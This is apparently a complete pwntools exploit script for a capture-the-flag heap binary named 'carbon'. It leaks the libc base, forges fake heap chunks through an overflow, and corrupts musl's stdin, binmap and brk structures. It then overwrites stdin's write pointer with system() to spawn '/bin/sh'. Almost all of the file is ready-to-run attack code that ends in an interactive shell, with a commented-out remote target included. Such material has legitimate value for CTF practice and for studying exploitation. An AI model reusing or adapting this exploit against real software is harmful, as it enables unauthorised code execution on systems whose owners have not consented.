from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
io = process('carbon')
# io = remote('node4.buuoj.cn', 26888)
# libc = ELF('/home/payoung/Downloads/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so')
libc = ELF('libc.so')
elf = ELF('carbon')


def add(size, content, overflow = False):
    io.sendlineafter('> ', '1')
    io.sendlineafter('What is your prefer size? >', str(size))
    if overflow:
        io.sendlineafter('Are you a believer? >', 'Y')
    else:
        io.sendlineafter('Are you a believer? >', 'N')
    io.sendafter('Say hello to your new sleeve >', content)


def delete(index):
    io.sendlineafter('> ', '2')
    io.sendlineafter('What is your sleeve ID? >', str(index))


def edit(index, content):
    io.sendlineafter('> ', '3')
    io.sendlineafter('What is your sleeve ID? >', str(index))
    io.send(content)


def show(index):
    io.sendlineafter('> ', '4')
    io.sendlineafter('What is your sleeve ID? >', str(index))


def pwn():
    add(8, b'a' * 8)
    show(0)
    io.recvuntil(b'a' * 8)
    libc_base = u64(io.recvn(6).ljust(8, b'\x00')) - 0x96e50
    log.success('libc_base: ' + hex(libc_base))

    # 1. construct fake chunks(make sure next and prev writeable)
    add(0x10, b'A' * 0x10)                      # 1
    add(0x10, b'B' * 0x10)                      # 2, prevent consolidation
    add(0x10, b'C' * 0x10)                      # 3
    add(0x10, b'D' * 0x10)                      # 4, prevent consolidation
    add(0x10, b'E' * 0x10)                      # 5
    add(0x10, b'F' * 0x10)                      # 6, prevent consolidation
    add(0x10, b'G' * 0x10)                      # 7
    add(0x10, b'H' * 0x10)                      # 8, prevent consolidation
    delete(1)
    delete(3)
    
    stdin   = libc_base + 0x96200
    binmap  = libc_base + 0x96ac0
    brk     = libc_base + 0x99030
    bin_37  = libc_base + 0x96e40
    system  = libc_base + 0x43374

    payload  = b'X' * 0x10
    payload += p64(0x21) * 2 + b'X' * 0x10
    payload += p64(0x21) + p64(0x20) + p64(stdin - 0x10) + p64(stdin - 0x10)
    payload += p8(0x20) + b'\n'

    add(0x10, payload, True)                    # 1, heap overflow
    add(0x10, b'C' * 0x10)                      # 3
    delete(1)                                   # set binmap[0]

    edit(3, p64(binmap - 0x20) * 2)             
    add(0x10, b'C' * 0x10)                      # 1(3)
    delete(5)                                   # set binmap[0]

    edit(3, p64(brk - 0x10) * 2)             
    add(0x10, b'C' * 0x10)                      # 5(3)
    delete(7)                                   # set binmap[0]

    # 2. corrupt bin head and get arbitrary pointers
    edit(3, p64(bin_37 - 0x10) + p64(stdin - 0x10))
    add(0x10, b'C' * 0x10)                      # 7(3)
    add(0x50, b'\n')                            # 9 stdin

    edit(3, p64(bin_37 - 0x10) + p64(brk - 0x10))
    add(0x10, b'C' * 0x10)                      # 10(3)
    add(0x50, b'\n')                            # 11 brk

    edit(3, p64(bin_37 - 0x10) + p64(binmap - 0x20))
    add(0x10, b'C' * 0x10)                      # 12(3)
    add(0x50, b'\n')                            # 13 binmap-0x10

    # 3. corrupt stdin, binmap and brk
    payload = b"/bin/sh\x00"    # stdin->flags
    payload += b'X' * 0x20
    payload += p64(1)           # stdin->wpos
    payload += b'X' * 8
    payload += p64(0)           # stdin->wbase
    payload += b'X' * 8
    payload += p64(system)      # stdin->write

    edit(9, payload)                            # stdin
    edit(11, p64(0xbadbeef - 0x20) + b'\n')     # brk
    edit(13, b'X' * 0x10 + p64(0) + b'\n')      # binmap

    
    # 4. get shell
    # gdb.attach(io)
    io.sendlineafter(">", '1')
    io.sendlineafter("What is your prefer size? >", '0')
    # pause()
    io.interactive()


if __name__ == '__main__':
    pwn()
